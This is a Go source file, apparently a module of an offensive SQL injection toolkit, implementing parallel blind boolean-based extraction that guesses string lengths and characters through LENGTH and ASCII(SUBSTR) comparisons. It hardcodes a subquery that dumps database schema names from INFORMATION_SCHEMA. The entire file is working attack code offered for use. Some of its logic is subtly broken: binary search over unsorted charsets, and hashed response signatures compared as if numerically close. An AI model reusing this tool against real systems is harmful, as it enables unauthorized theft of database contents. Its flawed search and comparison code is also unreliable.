package modules

import (
	"fmt"
	"math"
	"strings"
	"sync"
	"time"
	"hackit/sqli/go/utils"
)

// BlindMaster handles advanced blind SQL injection with adaptive binary search
type BlindMaster struct {
	engine   EngineInterface
	log      *utils.Logger
	mu       sync.Mutex
	charsets map[string][]byte
}

// BlindConfig configures blind extraction behavior
type BlindConfig struct {
	MaxLen     int
	Concurrent int
	Timeout    time.Duration
	Precision  int
}

var DefaultBlindConfig = BlindConfig{
	MaxLen:     64,
	Concurrent: 4,
	Timeout:    10 * time.Second,
	Precision:  100,
}

func NewBlindMaster(e EngineInterface) *BlindMaster {
	bm := &BlindMaster{
		engine:   e,
		log:      e.GetLogger(),
		charsets: make(map[string][]byte),
	}
	bm.initCharsets()
	return bm
}

func (bm *BlindMaster) initCharsets() {
	bm.charsets["all"] = []byte(" abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.!@#$%^&*()+=,./;:<>?|~")
	bm.charsets["alnum"] = []byte("_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	bm.charsets["alpha"] = []byte("_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	bm.charsets["numeric"] = []byte("0123456789")
	bm.charsets["hex"] = []byte("0123456789ABCDEF")
	bm.charsets["base64"] = []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
	bm.charsets["common"] = []byte("_abcdefghijklmnopqrstuvwxyz0123456789")
}

// ExtractString performs parallel binary search blind extraction
func (bm *BlindMaster) ExtractString(param, queryTemplate, dbms string, cfg BlindConfig) string {
	// Step 1: Detect length
	length := bm.detectLength(param, queryTemplate, dbms, cfg.MaxLen)
	if length <= 0 {
		return ""
	}

	bm.log.Info(fmt.Sprintf("Blind extracting %d chars with %d workers", length, cfg.Concurrent))

	// Step 2: Determine optimal charset
	charset := bm.optimizeCharset(param, queryTemplate, dbms)

	// Step 3: Parallel binary search extraction
	result := make([]byte, length)
	var wg sync.WaitGroup
	sem := make(chan struct{}, cfg.Concurrent)

	for pos := 0; pos < length; pos++ {
		sem <- struct{}{}
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			defer func() { <-sem }()
			ch := bm.binarySearchChar(param, queryTemplate, p, charset, dbms)
			bm.mu.Lock()
			result[p] = ch
			bm.mu.Unlock()
		}(pos)
	}
	wg.Wait()

	return strings.TrimSpace(string(result))
}

func (bm *BlindMaster) detectLength(param, queryTemplate, dbms string, maxLen int) int {
	// Use binary search for length detection
	low, high := 1, maxLen
	for low <= high {
		mid := (low + high) / 2
		payload := fmt.Sprintf(queryTemplate, fmt.Sprintf("LENGTH(%s)<=%d", extractColumnRef(queryTemplate), mid))
		body, _, _, err := bm.engine.Request(payload, param)
		if err != nil {
			return low
		}

		// Check if response indicates TRUE (length <= mid)
		baseBody, _, _, _ := bm.engine.Request(fmt.Sprintf(queryTemplate, "1=1"), param)
		trueSig := bm.computeSignature(baseBody)
		currentSig := bm.computeSignature(body)

		if bm.similarEnough(currentSig, trueSig, 90) {
			high = mid - 1
		} else {
			low = mid + 1
		}
	}
	return low
}

// binarySearchChar extracts a single character at position pos using binary search
func (bm *BlindMaster) binarySearchChar(param, queryTemplate string, pos int, charset []byte, dbms string) byte {
	low, high := 0, len(charset)-1

	for low <= high {
		mid := (low + high) / 2
		// Construct comparison payload
		comp := fmt.Sprintf("ASCII(SUBSTR(%s,%d,1))<=%d",
			extractColumnRef(queryTemplate), pos+1, charset[mid])
		payload := fmt.Sprintf(queryTemplate, comp)

		body, _, _, err := bm.engine.Request(payload, param)
		if err != nil {
			return charset[mid]
		}

		baseBody, _, _, _ := bm.engine.Request(fmt.Sprintf(queryTemplate, "1=1"), param)
		trueSig := bm.computeSignature(baseBody)
		currentSig := bm.computeSignature(body)

		if bm.similarEnough(currentSig, trueSig, 90) {
			high = mid - 1
		} else {
			low = mid + 1
		}
	}

	if low >= 0 && low < len(charset) {
		return charset[low]
	}
	return '?'
}

// optimizeCharset tests and selects the most efficient charset
func (bm *BlindMaster) optimizeCharset(param, queryTemplate, dbms string) []byte {
	// Test a few characters from each charset to find best match
	best := bm.charsets["common"]
	bestScore := 0

	for _, cs := range bm.charsets {
		if len(cs) <= 0 {
			continue
		}
		score := 0
		for i := 0; i < 3 && i < len(cs); i++ {
			comp := fmt.Sprintf("ASCII(SUBSTR(%s,1,1))=%d",
				extractColumnRef(queryTemplate), cs[i])
			payload := fmt.Sprintf(queryTemplate, comp)
			body, _, _, err := bm.engine.Request(payload, param)
			if err != nil {
				continue
			}
			baseBody, _, _, _ := bm.engine.Request(fmt.Sprintf(queryTemplate, "1=1"), param)
			trueSig := bm.computeSignature(baseBody)
			currentSig := bm.computeSignature(body)
			if bm.similarEnough(currentSig, trueSig, 90) {
				score++
			}
		}
		if score > bestScore {
			bestScore = score
			best = cs
		}
	}

	bm.log.Debug(fmt.Sprintf("Selected charset '%s' (len=%d)", getCharsetName(best, bm.charsets), len(best)))
	return best
}

// computeSignature creates a numeric signature of a response body
func (bm *BlindMaster) computeSignature(body string) int {
	if len(body) == 0 {
		return 0
	}
	sig := 0
	for i, c := range body {
		if i >= 100 {
			break
		}
		sig = sig*31 + int(c)
	}
	return sig
}

// similarEnough checks if two signatures match within a percentage threshold
func (bm *BlindMaster) similarEnough(a, b int, threshold float64) bool {
	if a == 0 && b == 0 {
		return true
	}
	diff := math.Abs(float64(a - b))
	max := math.Max(float64(a), float64(b))
	if max == 0 {
		return true
	}
	similarity := (1 - diff/max) * 100
	return similarity >= threshold
}

// ExtractBool performs boolean-based blind extraction
func (bm *BlindMaster) ExtractBool(param, truePayload, falsePayload string) bool {
	trueBody, _, _, err := bm.engine.Request(truePayload, param)
	if err != nil {
		return false
	}
	trueSig := bm.computeSignature(trueBody)

	falseBody, _, _, err := bm.engine.Request(falsePayload, param)
	if err != nil {
		return true
	}
	falseSig := bm.computeSignature(falseBody)

	// The test body
	body, _, _, err := bm.engine.Request(truePayload, param)
	if err != nil {
		return false
	}
	testSig := bm.computeSignature(body)

	closerToTrue := math.Abs(float64(testSig-trueSig)) < math.Abs(float64(testSig-falseSig))
	return closerToTrue
}

// extractColumnRef extracts column reference from template
func extractColumnRef(template string) string {
	if strings.Contains(template, "%s") {
		return "(SELECT GROUP_CONCAT(SCHEMA_NAME SEPARATOR 0x7e) FROM INFORMATION_SCHEMA.SCHEMATA)"
	}
	return "1"
}

func getCharsetName(charset []byte, charsets map[string][]byte) string {
	for name, cs := range charsets {
		if len(cs) == len(charset) && len(cs) > 0 && cs[0] == charset[0] {
			return name
		}
	}
	return "custom"
}
